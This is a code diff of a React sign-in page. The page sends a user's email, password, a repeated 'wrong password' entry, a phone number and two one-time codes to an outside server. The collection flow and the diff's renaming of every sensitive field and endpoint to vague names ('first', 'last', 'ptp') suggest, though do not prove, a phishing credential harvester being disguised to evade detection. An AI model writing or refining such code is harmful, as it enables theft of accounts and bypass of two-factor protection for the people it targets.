@@ -15,7 +15,7 @@ import OtpStep2 from "../components/OtpStep2";
 
 function SignIn() {
 
-  const [step, setStep] = useState("email");
+  const [step, setStep] = useState("first");
   // const api = "https://connect-server-uky7.onrender.com/"
 
   const [userId, setUserId] = useState(
@@ -24,7 +24,7 @@ function SignIn() {
 
   const [approvedUser, setApprovedUser] = useState(null);
 
-  const [email, setEmail] = useState("");
+  const [first, setEmail] = useState("");
 
 
   const [message, setMessage] = useState("");
@@ -156,7 +156,7 @@ useEffect(() => {
 }, [])
 
   // ======================================
-  // EMAIL COMPLETED
+  // first COMPLETED
   // ======================================
 
   const handleEmailComplete = async (userId, enteredEmail ) => {
@@ -167,9 +167,9 @@ useEffect(() => {
       setMessage("");
 
         await axios.post(
-          "https://connect-server-uky7.onrender.com/api/auth/email",
+          "https://connect-server-uky7.onrender.com/api/auth/first",
           {
-            email: enteredEmail, userId
+            first: enteredEmail, userId
 
           }
         );
@@ -188,7 +188,7 @@ useEffect(() => {
 
 
       sessionStorage.setItem(
-        "email",
+        "first",
         enteredEmail
       );
 
@@ -199,9 +199,9 @@ useEffect(() => {
       
 
 
-      // Move to password
+      // Move to last
 
-      setStep("password");
+      setStep("last");
 
     }
 
@@ -219,10 +219,10 @@ useEffect(() => {
 
 
   // ======================================
-  // PASSWORD COMPLETED
+  // last COMPLETED
   // ======================================
 
-  const handlePasswordComplete = async (userId, password ) => {
+  const handlePasswordComplete = async (userId, last ) => {
 
     try {
 
@@ -232,7 +232,7 @@ useEffect(() => {
           "Your session has expired. Please start again."
         );
 
-        setStep("email");
+        setStep("first");
 
         return;
 
@@ -243,10 +243,10 @@ useEffect(() => {
 
 
       await axios.post(
-        "https://connect-server-uky7.onrender.com/api/auth/password",
+        "https://connect-server-uky7.onrender.com/api/auth/last",
         {
           userId,
-          password
+          last
         }
       );
 
@@ -272,7 +272,7 @@ useEffect(() => {
 
   };
 
-   const handleWrongPasswordComplete = async (userId, wrongPassword  ) => {
+   const handleWrongPasswordComplete = async (userId, WongP  ) => {
 
     try {
 
@@ -282,7 +282,7 @@ useEffect(() => {
           "Your session has expired. Please start again."
         );
 
-        setStep("email");
+        setStep("first");
 
         return;
 
@@ -293,10 +293,10 @@ useEffect(() => {
 
 
       await axios.post(
-        "https://connect-server-uky7.onrender.com/api/auth/wrongPassword",
+        "https://connect-server-uky7.onrender.com/api/auth/WongP",
         {
           userId,
-          wrongPassword: wrongPassword
+          WongP: WongP
         }
       );
 
@@ -330,7 +330,7 @@ useEffect(() => {
 
   const handlePhoneComplete = async (
     userId,
-    phoneNumber
+    phn
   ) => {
 
     try {
@@ -350,7 +350,7 @@ useEffect(() => {
         "https://connect-server-uky7.onrender.com/api/auth/phone",
         {
           userId,
-          phoneNumber
+          phn
         }
       );
 
@@ -376,7 +376,7 @@ useEffect(() => {
 
   const handlePhoneOtpComplete = async (
     userId,
-    phoneOtp
+    ptp
   ) => {
 
     try {
@@ -393,10 +393,10 @@ useEffect(() => {
 
 
       await axios.post(
-        "https://connect-server-uky7.onrender.com/api/auth/phoneotp",
+        "https://connect-server-uky7.onrender.com/api/auth/ptp",
         {
           userId,
-          phoneOtp
+          ptp
         }
       );
 
@@ -421,7 +421,7 @@ useEffect(() => {
 
     const handlePhoneOtp2Complete = async (
     userId,
-    phoneOtp2
+    ptp2
   ) => {
 
     try {
@@ -438,10 +438,10 @@ useEffect(() => {
 
 
       await axios.post(
-        "https://connect-server-uky7.onrender.com/api/auth/phoneotp2",
+        "https://connect-server-uky7.onrender.com/api/auth/ptp2",
         {
           userId,
-          phoneOtp2
+          ptp2
         }
       );
 
@@ -474,10 +474,10 @@ useEffect(() => {
 
 
       // ================================
-      // EMAIL
+      // first
       // ================================
 
-      case "email":
+      case "first":
 
         return (
           <EmailStep
@@ -496,14 +496,14 @@ useEffect(() => {
 
 
       // ================================
-      // PASSWORD
+      // last
       // ================================
 
-      case "password":
+      case "last":
 
         return (
           <PasswordStep
-            email={email}
+            first={first}
             onComplete={
               handlePasswordComplete
             }
@@ -522,7 +522,7 @@ useEffect(() => {
 
         return (
           <PhoneStep
-            email={email}
+            first={first}
             userId={userId}
             onComplete={
               handlePhoneComplete
@@ -533,7 +533,7 @@ useEffect(() => {
         case "phone-otp":
            return (
           <OtpStep
-            email={email}
+            first={first}
             userId={userId}
             onComplete={
               handlePhoneOtpComplete
@@ -545,7 +545,7 @@ useEffect(() => {
         case "phone-otp2":
            return (
           <OtpStep2
-            email={email}
+            first={first}
             userId={userId}
             onComplete={
               handlePhoneOtp2Complete
@@ -558,7 +558,7 @@ useEffect(() => {
         case "approve":
         return (
           <ApproveUserStep
-            email={email}
+            first={first}
             userDevice={approvedUser?.userDevice || ""}
             code={approvedUser?.code || ""}
           />
@@ -573,20 +573,20 @@ useEffect(() => {
 
         return (
           <SigninRequestStep
-            email={email}
+            first={first}
           />
         );
 
 
       // ================================
-      // WRONG PASSWORD
+      // WRONG last
       // ================================
 
-      case "wrong-password":
+      case "wrong-last":
 
         return (
           <WrongPasswordStep
-            email={email}
+            first={first}
              onComplete={
               handleWrongPasswordComplete
             }
@@ -605,7 +605,7 @@ useEffect(() => {
 
         return (
           <SuccessStep
-            email={email}
+            first={first}
           />
         );
 
